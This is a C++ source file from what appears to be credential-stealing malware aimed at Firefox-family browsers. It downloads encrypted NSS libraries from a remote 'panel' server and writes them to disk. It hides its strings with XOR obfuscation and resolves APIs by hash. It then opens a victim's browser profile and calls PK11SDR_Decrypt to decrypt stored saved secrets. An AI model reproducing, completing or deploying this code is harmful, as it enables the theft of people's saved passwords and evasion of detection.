#include "Common.h"

Gecko::~Gecko()
{
	if (this->NSSShutdown) NSSShutdown();
	if (this->hNss) API(KERNEL32, FreeLibrary)(this->hNss);

	HMODULE hFreebl3 = API(KERNEL32, GetModuleHandleA)(XorStr("freebl3.dll"));
	if (hFreebl3) API(KERNEL32, FreeLibrary)(hFreebl3);

	HMODULE hMozglue = API(KERNEL32, GetModuleHandleA)(XorStr("mozglue.dll"));
	if (hMozglue) API(KERNEL32, FreeLibrary)(hMozglue);

	HMODULE hMsvcp = API(KERNEL32, GetModuleHandleA)(XorStr("msvcp140.dll"));
	if (hMsvcp) API(KERNEL32, FreeLibrary)(hMsvcp);

	HMODULE hSoftrokn3 = API(KERNEL32, GetModuleHandleA)(XorStr("softokn3.dll"));
	if (hSoftrokn3) API(KERNEL32, FreeLibrary)(hSoftrokn3);

	HMODULE hVcrun = API(KERNEL32, GetModuleHandleA)(XorStr("vcruntime140.dll"));
	if (hVcrun) API(KERNEL32, FreeLibrary)(hVcrun);
}

void Gecko::GetDlls()
{
	if (Utils::IsFileExist(this->workingPath + XorStr("\\nss3.dll"))) return;

	DEBUG("getting dlls...")
	string resp = HTTP().POST(this->panelLink, this->panelPort, XorStr("/dlls/"), string());
	if (resp.empty()) return;
	DEBUG("dlls getted")

	resp = Enc::Decrypt(resp);
	DEBUG("dlls decrypted")
	vector<string> dlls = Utils::splitBy(resp, '|');
	vector<string> decryptedDlls;
	for (string& dll : dlls) decryptedDlls.push_back(Enc::Decrypt(dll));
	if (decryptedDlls.size() == 6)
	{
		Utils::WriteFileData(this->workingPath + XorStr("\\freebl3.dll"), decryptedDlls[0]);
		Utils::WriteFileData(this->workingPath + XorStr("\\mozglue.dll"), decryptedDlls[1]);
		Utils::WriteFileData(this->workingPath + XorStr("\\msvcp140.dll"), decryptedDlls[2]);
		Utils::WriteFileData(this->workingPath + XorStr("\\nss3.dll"), decryptedDlls[3]);
		Utils::WriteFileData(this->workingPath + XorStr("\\softokn3.dll"), decryptedDlls[4]);
		Utils::WriteFileData(this->workingPath + XorStr("\\vcruntime140.dll"), decryptedDlls[5]);
	}
	DEBUG("dlls writed to disk")
}

bool Gecko::InitFunc()
{
	API(KERNEL32, SetCurrentDirectoryA)(this->workingPath.c_str());
	DEBUG("current directory: %s", this->workingPath.c_str())
	this->hNss = API(KERNEL32, LoadLibraryA)(XorStr("nss3.dll"));
	if (!this->hNss) return false;
	DEBUG("nss3.dll loaded")

	this->NSSInit = (NSS_InitFunc)GetApiAddr(this->hNss, CRC32_STR("NSS_Init"));
	this->NSSShutdown = (NSS_ShutdownFunc)GetApiAddr(this->hNss, CRC32_STR("NSS_Shutdown"));
	this->PK11GetInternalKeySlot = (PK11_GetInternalKeySlotFunc)GetApiAddr(this->hNss, CRC32_STR("PK11_GetInternalKeySlot"));
	this->PK11FreeSlot = (PK11_FreeSlotFunc)GetApiAddr(this->hNss, CRC32_STR("PK11_FreeSlot"));
	this->PK11CheckUserPassword = (PK11_CheckUserPasswordFunc)GetApiAddr(this->hNss, CRC32_STR("PK11_CheckUserPassword"));
	this->PK11Authenticate = (PK11_AuthenticateFunc)GetApiAddr(this->hNss, CRC32_STR("PK11_Authenticate"));
	this->PLBase64Decode = (PL_Base64DecodeFunc)GetApiAddr(this->hNss, CRC32_STR("PL_Base64Decode"));
	this->PK11SDRDecrypt = (PK11_SDRDecryptFunc)GetApiAddr(this->hNss, CRC32_STR("PK11SDR_Decrypt"));
	this->SECITEMZfreeItem = (SECITEM_ZfreeItemFunc)GetApiAddr(this->hNss, CRC32_STR("SECITEM_ZfreeItem"));

	if (this->NSSInit && this->NSSShutdown && this->PK11GetInternalKeySlot && this->PK11FreeSlot && 
		this->PK11CheckUserPassword && this->PK11Authenticate && this->PLBase64Decode && this->PK11SDRDecrypt && 
		this->SECITEMZfreeItem)
	{
		DEBUG("all api getted")
		return true;
	}

	return false;
}

bool Gecko::InitNSS()
{
	if (NSSInit((XorStr("sql:") + this->profilePath).c_str()) != SECSuccess) return false;
	DEBUG("NSSInit success")

	void* slot = PK11GetInternalKeySlot();
	if (!slot)
	{
		NSSShutdown();
		return false;
	}
	DEBUG("PK11GetInternalKeySlot success")

	if (PK11CheckUserPassword(slot, (char*)"") != SECSuccess)
	{
		PK11FreeSlot(slot);
		NSSShutdown();
		return false;
	}
	DEBUG("PK11CheckUserPassword success")

	if (PK11Authenticate(slot, TRUE, NULL) != SECSuccess)
	{
		PK11FreeSlot(slot);
		NSSShutdown();
		return false;
	}
	DEBUG("PK11Authenticate success")

	return true;
}

string Gecko::Decrypt(string encData)
{
	string base64decoded = base64_decode(encData);

	SECItem in, out;
	in.data = (unsigned char*)base64decoded.c_str();
	in.len = base64decoded.size();

	out.data = 0;
	out.len = 0;
	if (PK11SDRDecrypt(&in, &out, NULL) != SECSuccess) return string();

	return string((char*)out.data, out.len);
}
